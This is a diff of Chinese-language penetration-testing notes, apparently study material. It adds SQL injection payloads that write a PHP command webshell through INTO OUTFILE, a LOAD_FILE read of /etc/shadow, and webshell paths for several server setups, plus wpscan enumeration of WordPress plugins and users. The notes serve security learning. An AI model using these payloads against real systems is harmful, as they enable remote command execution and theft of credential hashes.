@@ -73,12 +73,23 @@ date: 2024-02-07
     ' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
     ' UNION SELECT username,password,3,4,5 FROM users-- -
 
-    # 插入 webshell (MySQL)
+    # 插入 webshell (MySQL+PHP)
     ## 1. MySQL 使用者有 FILE 權限（能讀寫檔案）
     ## 2. MySQL 的 secure_file_priv 沒有限制寫入路徑（或設為空）
     ## 3. 目標路徑（/var/www/html/tmp/）MySQL 進程有寫入權限
     ## 4. 該檔案不能已存在（INTO OUTFILE 不會覆蓋）
     ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4,5 INTO OUTFILE '/var/www/html/tmp/shell.php'-- -
+    ' UNION SELECT 1,LOAD_FILE('/etc/shadow'),3,4,5-- - # 讀敏感資訊
+
+    ## 如果是其使用其他系統
+    -- Linux
+    INTO OUTFILE '/var/www/html/tmp/shell.php'
+
+    -- Windows XAMPP
+    INTO OUTFILE 'C:/xampp/htdocs/tmp/shell.php'
+
+    -- Windows IIS + PHP
+    INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'
     ```
 * Error-Based
     ```sql
@@ -579,11 +590,16 @@ create一個偽造的payload和一個對外的中間server溝通，並讓這個�
 ```bash
 $ cp /usr/share/webshells/php/simple-backdoor.php . # php
 $ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 webshell
-$ 
 ```
 
 ### 如果是WordPress網頁
+起手式一定是用 wpscan 去掃 plugin 版本，查 exploit
+* 所以流程是：(nmap+ffuf)列舉發現 WordPress → 識別 plugin → searchsploit 找漏洞 → 手動測試或 sqlmap 利用。不需要 wpscan，標準的 web 列舉流程就能走到這一步。
 * [WpScan](https://wpscan.com/)專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等
+    ```bash
+    # 跑 wpscan 找外掛和使用者
+    $ wpscan --url http://alvida-eatery.local -e ap,at,u --plugins-detection aggressive # 代表 enum 出 all plugin/all theme/user
+    ```
 
 ## Tools
 
